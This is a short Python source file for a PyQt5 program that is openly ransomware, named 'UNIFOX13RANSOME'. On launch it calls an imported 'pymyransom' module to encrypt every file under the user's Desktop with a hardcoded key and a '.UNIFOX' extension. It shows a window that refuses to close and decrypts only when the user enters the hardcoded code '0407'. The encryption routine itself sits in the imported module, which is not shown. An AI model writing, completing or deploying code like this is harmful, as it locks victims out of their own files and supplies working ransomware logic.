from PyQt5 import QtCore, QtGui, QtWidgets
import unifoxransomware_ui
import pymyransom
import getpass

class UNIFOX13RANSOME(QtWidgets.QMainWindow):
    
    def __init__(self):
        super().__init__()
        self.ui = unifoxransomware_ui.Ui_MainWindow()
        self.username = getpass.getuser()
        self.Victim = pymyransom.makeMyRansomware(your_extension=".UNIFOX", key=b"unifoxransomware", passFile=f"C:\\Users\\{self.username}\\Desktop\\FOXWARE.exe")
        self.startpath = f"C:\\Users\\{self.username}\\Desktop\\**"
        self.initUI()
        
    def initUI(self):               
        self.ui.setupUi(self)
        self.show()
        
    def closeEvent(self, event):
        QtWidgets.QMessageBox.critical(self, "Ouch!", "Oh no, my brain! it's broken")
        event.ignore()

    def Decrypt(self):
        user_key = self.ui.textEdit.toPlainText()
        if user_key == "0407":
            self.Victim.Decryptor(self.startpath)
            sys.exit(0)
        else:
            QtWidgets.QMessageBox.critical(self,"ERROR","NO THANKS")

            
if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = UNIFOX13RANSOME()
    MainWindow.Victim.Encryptor(MainWindow.startpath)
    MainWindow.ui.pushButton.clicked.connect(MainWindow.Decrypt)
    sys.exit(app.exec_())
    


